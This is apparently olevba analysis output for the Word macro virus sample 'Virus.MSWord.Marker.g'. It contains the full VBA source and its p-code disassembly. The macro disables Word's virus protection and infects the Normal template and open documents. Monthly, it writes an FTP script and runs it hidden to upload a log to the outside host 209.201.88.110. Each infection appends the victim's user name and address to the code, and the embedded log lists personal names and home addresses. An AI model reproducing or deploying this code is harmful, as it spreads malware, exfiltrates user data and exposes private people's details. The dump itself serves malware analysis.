olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim chk As Object
Dim nt As Object

Sub Document_Open()
    On Error GoTo Err
    If Dir("C:\temp\~msd13.tmp") <> "" Then
        SetAttr "C:\temp\~msd13.tmp", 0
        Kill ("C:\temp\~msd13.tmp")                                  'delete April
    End If
    Set chk = NormalTemplate
    Call Scan_Code(chk)
    Set chk = ActiveDocument
    Call Scan_Code(chk)
    
    Exit Sub
Err:
    MsgBox "An unknown error occurred", 48, "Error"
End Sub

Function Scan_Code(chk As Object)
    For x = 1 To chk.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x, 1) = "    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With" Then
            If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x - 4, 1) = "Private Sub Document_Close()" Then
                startline = (x - 4)
            End If
        End If
        If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x, 1) = "    If LOF(1) = 0 Then GoTo q" Then
            If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x + 4, 1) = "    t.CodeModule.InsertLines i, a" Then
                lastline = (x + 13)
                lastline = lastline - startline + 1
            End If
        End If
    Next x
    If lastline <> "" And startline <> "" Then
        chk.VBProject.VBComponents.Item(1).CodeModule.deletelines startline, lastline
        chk.Save
        MsgBox chk & " " & " was disinfected successfully!", vbOKOnly, "Disinfection Complete!"
    End If
End Function
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 03:07:26 PM - Tuesday, 22 Dec 1998
' BCBSA
'



' 03:28:02 PM - Wednesday, 6 Jan 1999
' BCBSA
'



' 07:38:20 AM - Tuesday, 12 Jan 1999
' Fairmont Hotel - Chicago
'



' 08:52:41 AM - Monday, 1 Feb 1999
' Pam Ganiel
' Pamela Bray Ganiel
' 204 Foxfire Court
' Downers Grove, IL 60515



' 09:40:47 AM - Monday, 8 Feb 1999
' Steve Davino
'



' 10:07:53 AM - Wednesday, 10 Feb 1999
' Plaza Hotel
'



' 09:28:42 AM - Friday, 19 Feb 1999
' Plaza Hotel
'



' 10:05:01 AM - Friday, 19 Feb 1999
' Plaza Hotel
'



' 09:39:53  - Tuesday, 23 Feb 1999
' Pia Marocco
'



' 10:28:07  - Friday, 26 Feb 1999
' Dell Optiplex
'



' 08:21:19  - jueves, 4 mar 1999
' INDRA
'



' 11:23:23 PM - Wednesday, 10 Mar 1999
' Sam Panesar
'



' 10:02:54 PM - Wednesday, 10 Mar 1999
' ENDUSER
' Cynthia K. Seymour
' 126 University Gardens #3
' Charlottesville, VA 22903



' 04:44:24 PM - Sábado, 20 Mar 1999
' Gerardo Ibarra
'



' 05:06:43 PM - Tuesday, 23 Mar 1999
' 1518
'



' 02:05:06 PM - Wednesday, 24 Mar 1999
' Sanford Antignas
'



' 02:18:36  - Thursday, 25 Mar 1999
' AS
'



' 11:24:16  - Monday, 29 Mar 1999
' EGWY
'



' 03:22:12 PM - Thursday, 8 Apr 1999
' Ditry PC
'



' 02:47:23  - ñóááîòà, 8 ìàé 1999
' Mike Pavluschick
'



' 11:07:52 PM - Sunday, 27 Jun 1999
' Costin RAIU
' craiu@gecad.ro



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14107 bytes
' Line #0:
' 	Dim 
' 	VarDefn chk (As Object)
' Line #1:
' 	Dim 
' 	VarDefn nt (As Object)
' Line #2:
' Line #3:
' 	FuncDefn (Sub Document_Open())
' Line #4:
' 	OnError Err 
' Line #5:
' 	LitStr 0x0012 "C:\temp\~msd13.tmp"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #6:
' 	LitStr 0x0012 "C:\temp\~msd13.tmp"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #7:
' 	LitStr 0x0012 "C:\temp\~msd13.tmp"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0045 0x000C "delete April"
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set chk 
' Line #10:
' 	Ld chk 
' 	ArgsCall (Call) Scan_Code 0x0001 
' Line #11:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set chk 
' Line #12:
' 	Ld chk 
' 	ArgsCall (Call) Scan_Code 0x0001 
' Line #13:
' Line #14:
' 	ExitSub 
' Line #15:
' 	Label Err 
' Line #16:
' 	LitStr 0x0019 "An unknown error occurred"
' 	LitDI2 0x0030 
' 	LitStr 0x0005 "Error"
' 	ArgsCall MsgBox 0x0003 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Function Scan_Code(chk As Object, id_FFFE As Variant))
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #21:
' 	Ld x 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0060 "    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Sub 
' 	Paren 
' 	St startline 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld x 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "    If LOF(1) = 0 Then GoTo q"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Add 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0021 "    t.CodeModule.InsertLines i, a"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Add 
' 	Paren 
' 	St lastline 
' Line #29:
' 	Ld lastline 
' 	Ld startline 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St lastline 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld lastline 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld startline 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #34:
' 	Ld startline 
' 	Ld lastline 
' 	LitDI2 0x0001 
' 	Ld chk 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #35:
' 	Ld chk 
' 	ArgsMemCall Save 0x0000 
' Line #36:
' 	Ld chk 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x001E " was disinfected successfully!"
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0016 "Disinfection Complete!"
' 	ArgsCall MsgBox 0x0003 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndFunc 
' Line #39:
' 	FuncDefn (Private Sub Document_Close())
' Line #40:
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' Line #43:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #44:
' Line #45:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #46:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #47:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #48:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #53:
' Line #54:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #55:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #56:
' Line #57:
' Line #58:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' Line #61:
' Line #62:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #63:
' Line #64:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #66:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #71:
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #73:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #76:
' Line #77:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #80:
' Line #81:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #90:
' Line #91:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #92:
' Line #93:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #94:
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #99:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #100:
' Line #101:
' Line #102:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #103:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #104:
' Line #105:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #106:
' Line #107:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #108:
' Line #109:
' Line #110:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #111:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #112:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #113:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #114:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' Line #121:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #122:
' Line #123:
' Line #124:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #125:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #126:
' Line #127:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #128:
' Line #129:
' 	EndIfBlock 
' Line #130:
' Line #131:
' Line #132:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #133:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #134:
' Line #135:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #136:
' Line #137:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #138:
' Line #139:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #140:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #141:
' Line #142:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #143:
' Line #144:
' 	EndIfBlock 
' Line #145:
' Line #146:
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	EndSub 
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #154:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #155:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #156:
' 	QuoteRem 0x0000 0x0000 ""
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #161:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #162:
' 	QuoteRem 0x0000 0x0000 ""
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #167:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #168:
' 	QuoteRem 0x0000 0x0000 ""
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #173:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #174:
' 	QuoteRem 0x0000 0x0000 ""
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x0023 " 03:07:26 PM - Tuesday, 22 Dec 1998"
' Line #179:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #180:
' 	QuoteRem 0x0000 0x0000 ""
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x0024 " 03:28:02 PM - Wednesday, 6 Jan 1999"
' Line #185:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x0023 " 07:38:20 AM - Tuesday, 12 Jan 1999"
' Line #191:
' 	QuoteRem 0x0000 0x0019 " Fairmont Hotel - Chicago"
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x0021 " 08:52:41 AM - Monday, 1 Feb 1999"
' Line #197:
' 	QuoteRem 0x0000 0x000B " Pam Ganiel"
' Line #198:
' 	QuoteRem 0x0000 0x0013 " Pamela Bray Ganiel"
' Line #199:
' 	QuoteRem 0x0000 0x0012 " 204 Foxfire Court"
' Line #200:
' 	QuoteRem 0x0000 0x0018 " Downers Grove, IL 60515"
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0021 " 09:40:47 AM - Monday, 8 Feb 1999"
' Line #205:
' 	QuoteRem 0x0000 0x000D " Steve Davino"
' Line #206:
' 	QuoteRem 0x0000 0x0000 ""
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' 	QuoteRem 0x0000 0x0025 " 10:07:53 AM - Wednesday, 10 Feb 1999"
' Line #211:
' 	QuoteRem 0x0000 0x000C " Plaza Hotel"
' Line #212:
' 	QuoteRem 0x0000 0x0000 ""
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0022 " 09:28:42 AM - Friday, 19 Feb 1999"
' Line #217:
' 	QuoteRem 0x0000 0x000C " Plaza Hotel"
' Line #218:
' 	QuoteRem 0x0000 0x0000 ""
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x0022 " 10:05:01 AM - Friday, 19 Feb 1999"
' Line #223:
' 	QuoteRem 0x0000 0x000C " Plaza Hotel"
' Line #224:
' 	QuoteRem 0x0000 0x0000 ""
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0021 " 09:39:53  - Tuesday, 23 Feb 1999"
' Line #229:
' 	QuoteRem 0x0000 0x000C " Pia Marocco"
' Line #230:
' 	QuoteRem 0x0000 0x0000 ""
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x0020 " 10:28:07  - Friday, 26 Feb 1999"
' Line #235:
' 	QuoteRem 0x0000 0x000E " Dell Optiplex"
' Line #236:
' 	QuoteRem 0x0000 0x0000 ""
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x001F " 08:21:19  - jueves, 4 mar 1999"
' Line #241:
' 	QuoteRem 0x0000 0x0006 " INDRA"
' Line #242:
' 	QuoteRem 0x0000 0x0000 ""
' Line #243:
' Line #244:
' Line #245:
' Line #246:
